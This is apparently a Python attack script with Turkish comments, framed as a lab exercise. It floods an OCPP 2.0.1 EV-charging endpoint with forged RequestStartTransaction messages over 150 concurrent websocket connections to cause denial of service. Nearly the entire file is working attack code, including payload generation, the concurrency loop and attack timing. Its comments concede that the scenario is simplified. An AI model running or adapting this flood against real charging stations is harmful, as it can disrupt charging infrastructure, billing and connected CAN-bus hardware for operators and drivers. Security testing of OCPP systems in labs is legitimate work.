                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         attacker_can_flood.py
# WARNING: Bu kod, laboratuvar ortamında yalnızca egitim ve test amacli kullanilmalidir.
# Gercek sistemlere karsi kullanilmasi yasal ve etik sorunlara yol acacaktir.
import platform
import asyncio
import websockets
import json
import random
import uuid
import time
import logging

# Ayarlar
logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')

# --- KRİTİK LAB AYARLARI ---
# CP'nin CSMS'e baglandigi adresi girin (CSMS sunucusunu hedef aliyor)
TARGET_WS_URL = "ws://127.0.0.1:9000/CP_TEST"
CONCURRENCY_LEVEL = 150 # Eşzamanlı açılacak bağlantı sayısı (Lab'a göre ayarlanmalı: 50-200 arasi deneyin)
ATTACK_DURATION_SECONDS = 60 # 1 dakika boyunca saldır
# ---------------------------

def generate_remote_start_payload():
    """CP'nin RequestStartTransaction handler'ını tetikleyecek kötü amaçlı yükü üretir."""

    unique_id = str(uuid.uuid4())
    random_tx_id = random.randint(100000, 999999)

    # OCPP 2.0.1 RemoteStartTransaction JSON formatı simüle edilir.
    # CSMS'den CP'ye giden mesaj formatı: [2, unique_id, action, {payload}]
    ocpp_request = [
        2,  # CallType
        unique_id, # Benzersiz Mesaj ID'si
        "RequestStartTransaction",
        {
            "remoteStartId": random_tx_id,
            "idToken": {
                "id": f"MALWARE_{random_tx_id}",
                "type": "ISO14443"
            },
            "evseId": 1 # EVSE 1 hedef alınır
        }
    ]
    return json.dumps(ocpp_request)

async def attack_cp(thread_id):
    """Her eşzamanlı iş parçacığı, CP'ye sürekli RemoteStart komutu gönderir."""

    # Saldırganın CSMS'i taklit ederek CP ile iletişime geçmesi gerekir.
    # Bu, CP'nin CSMS'e açtığı bağlantıyı ele geçirmek veya aynı adrese yeni bağlantı açmak demektir.

    try:
        # CP ile WebSocket bağlantısı kurulur.
        # Lab ortamında, CP'nin CSMS'e zaten bağlı olduğu varsayılır.
        # Saldırgan bu kanalı taklit etmeye çalışır.

        # Bu senaryonun en gerçekçi simülasyonu için, bu kod CSMS'in içinde çalıştırılmalıdır.
        # Dışarıdan bağlantı kurulamaz, çünkü CP istemci olarak çalışıyor.

        # LABORTAMINA ÖZEL: CSMS'in tek bağlantısını hedeflemek için yeni bağlantı açılır
        # veya CSMS'in kendi döngüsü kullanılır. Burada CSMS'i taklit eden bir istemci rolü üstlenilir:

        async with websockets.connect(TARGET_WS_URL, subprotocols=['ocpp2.0.1']) as ws:
            logging.info(f"🟢 [SALDIRGAN {thread_id}]: Bağlantı kuruldu.")

            start_time = time.time()
            while (time.time() - start_time) < ATTACK_DURATION_SECONDS:

                # RemoteStart yükü üretilir
                malicious_payload = generate_remote_start_payload()

                # Yükü hedefe gönder
                # Buradaki saldırgan, CP'nin CSMS ile konuşuyormuş gibi görünüyor.
                # Ancak saldırının başarılı olması için, CP'nin bu mesajı CSMS'den geldiğini düşünmesi gerekir.
                # CP istemci olduğu için, saldırganın CSMS'i taklit etmesi gerekir.

                # Basitleştirme: CP'nin CSMS'den gelen her mesajı RequestStartTransaction olarak algılaması beklenir.

                # Direkt olarak CP'ye RemoteStartTransaction mesajı gönderilir.
                # Mesaj formatı Call tipinde olmalıdır (CSMS'den CP'ye giden komut)
                await ws.send(malicious_payload)

                # Her RequestStartTransaction, CP'nin CAN bus'a mesaj göndermesine ve
                # MeterValues simülasyonu başlatmasına neden olur.

                # Yükü artırmak için minimum gecikme
                await asyncio.sleep(random.uniform(0.001, 0.005)) # 1-5 ms arasi bekleme

    except websockets.exceptions.ConnectionClosed as e:
        logging.error(f"🔴 [SALDIRGAN {thread_id}]: Bağlantı kesildi: {e}")
    except Exception as e:
        logging.error(f"❌ [SALDIRGAN {thread_id}]: Genel Hata: {e}")

async def main():
    print("=" * 80)
    print("🛑 LAB SİMÜLASYONU: CP GÖREV YÜKLEME (TASK OVERLOAD) DoS BAŞLATILIYOR")
    print(f"Hedef URL: {TARGET_WS_URL} | Eşzamanlılık: {CONCURRENCY_LEVEL}")
    print("UYARI: Bu saldırı, CP'deki asyncio ve CAN kaynaklarını tüketecektir.")
    print("=" * 80)

    # Eşzamanlı görevleri başlat
    tasks = [attack_cp(i) for i in range(CONCURRENCY_LEVEL)]

    # Tüm görevlerin tamamlanmasını bekle (veya saldırı süresinin dolmasını)
    await asyncio.gather(*tasks)

    logging.info("✅ Saldırı Simülasyonu tamamlandı.")

if __name__ == '__main__':
    try:
        # Windows/Linux uyumluluğu için
        if platform.system() == "Windows":
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

        import platform # Platform kütüphanesi import edilir
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("Kullanıcı tarafından durduruldu.")
    except Exception as e:
        logging.error(f"Ana program hatası: {e}")




